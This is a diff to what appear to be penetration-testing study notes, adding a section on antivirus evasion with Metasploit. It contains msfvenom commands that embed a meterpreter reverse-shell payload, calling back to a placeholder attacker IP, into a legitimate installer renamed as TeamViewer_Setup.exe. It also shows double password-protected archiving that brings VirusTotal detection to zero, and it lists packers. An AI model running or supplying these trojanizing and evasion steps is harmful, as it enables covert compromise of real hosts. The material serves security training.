@@ -1217,10 +1217,9 @@ meterpreter > getuid
 <details>
 <summary><h4>Terms</h4></summary>
 
-To better learn how we can efficiently and quietly attack a target, we first need to understand better how that target is defended. We are introduced to two new terms:
+To better learn how we can efficiently and quietly attack a target, we first need to understand better how that target is defended. It is important to understand these two terms:
 
 * **Endpoint protection:** Endpoint protection refers to any localized device or service whose sole purpose is to protect a single host on the network. The host can be a personal computer, a corporate workstation, or a server in a network's De-Militarized Zone (DMZ).
-
 
 * **Security Policies:** They are essentially a list of allow and deny statements that dictate how traffic or files can exist within a network boundary. These lists can also target different features of the network and hosts, depending on where they reside:
 
@@ -1245,7 +1244,132 @@ There are multiple ways to match an event or object with a security policy entry
 <details>
 <summary><h4>Evasion Techniques</h4></summary>
 
+> This section covers evasion at a high level. Be on the lookout for later modules that will dig deeper into the knowledge needed to perform evasion more effectively.
+
+<details>
+<summary><h5>EXE</h5></summary>
+
 We can embed the shellcode into any installer, package, or program that we have at hand, hiding the payload shellcode deep within the legitimate code of the actual product. This greatly obfuscates our malicious code and, more importantly, lowers our detection chances.
+
+```bash
+msfvenom windows/x86/meterpreter_reverse_tcp LHOST=<ATTACKER IP> LPORT=<ATTACKER PORT> -k -x ~/Downloads/GTA_SA_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ./TeamViewer_Setup.exe -i 5
+``` 
+
+</details>
+
+<details>
+<summary><h5>Archives</h5></summary>
+
+Archiving a piece of information such as a file, folder, script, executable, picture, or document and placing a password on the archive bypasses a lot of common anti-virus signatures today. However, the downside of this process is that they will be raised as notifications in the AV alarm dashboard as being unable to be scanned due to being locked with a password.
+
+```bash
+msfvenom windows/x86/meterpreter_reverse_tcp LHOST=<ATTACKER IP> LPORT=<ATTACKER PORT> -k -e x86/shikata_ga_nai -a x86 --platform windows -o ./test.js -i 5
+``` 
+
+If we try to view the content of the file, we will get something like this:
+
+```bash
+cat test.js
+
+# �+n"����t$�G4ɱ1zz��j�V6����ic��o�Bs>��Z*�����9vt��%��1�
+# ...
+# �Qa*���޴��RW�%Š.\�=;.l�T���XF���T��
+``` 
+
+We can inspect the file using VirusTotal 
+
+```bash
+msf-virustotal -k <API key> -f test.js 
+
+# [*] Using API key: <API key>
+# ...
+# [*] Analysis Report: test.js (11 / 59): ...
+``` 
+
+So far, we have achieved a 82% success ratem but we can achieve even more.
+
+Let's compress the payload using rar
+
+```bash
+wget https://www.rarlab.com/rar/rarlinux-x64-612.tar.gz
+tar -xzvf rarlinux-x64-612.tar.gz && cd rar
+``` 
+
+We can now compress the file with a password
+```bash
+rar a ~/test.rar -p ~/test.js
+
+# Enter password (will not be echoed): ******
+# Reenter password: ******
+# ...
+# Done
+``` 
+
+At this point, we will have two files:
+
+```bash
+ls
+
+#test.js   test.rar
+``` 
+
+Now, we remove the .rar extension
+
+```bash
+mv test.rar test
+ls
+
+#test.js   test
+``` 
+
+We archive the payload one more time
+
+```bash
+rar a final.rar -p test
+
+# Enter password (will not be echoed): ******
+# Reenter password: ******
+# ...
+# Done
+``` 
+
+Finally, we remove the .rar extension one more time
+
+```bash
+mv final.rar final
+``` 
+
+After that, we can proceed to upload it on VirusTotal for another check.
+
+```bash
+msf-virustotal -k <API key> -f final
+
+# [*] Using API key: <API key>
+# ...
+# [*] Analysis Report: final (0 / 59): ...
+``` 
+
+As we can see from the above, this is an excellent way to transfer data both to and from the target host.
+
+</details>
+
+<details>
+<summary><h5>Packers</h5></summary>
+
+The term Packer refers to the result of an executable compression process where the payload is packed together with an executable program and with the decompression code in one single file. This process takes place transparently for the compressed executable to be run the same way as the original executable while retaining all of the original functionality. In addition, msfvenom provides the ability to compress and change the file structure of a backdoored executable and encrypt the underlying process structure.
+
+Here is a list of popular packer software:
+
+* [UPX packer](https://upx.github.io/)
+* [The Enigma Protector](https://enigmaprotector.com/)
+* [MPRESS](https://web.archive.org/web/20240310213323/https://www.matcode.com/mpress.htm)
+* Alternate EXE Packer
+* ExeStealth
+* Morphine
+* MEW
+* Themida
+
+</details>
 
 </details>
 
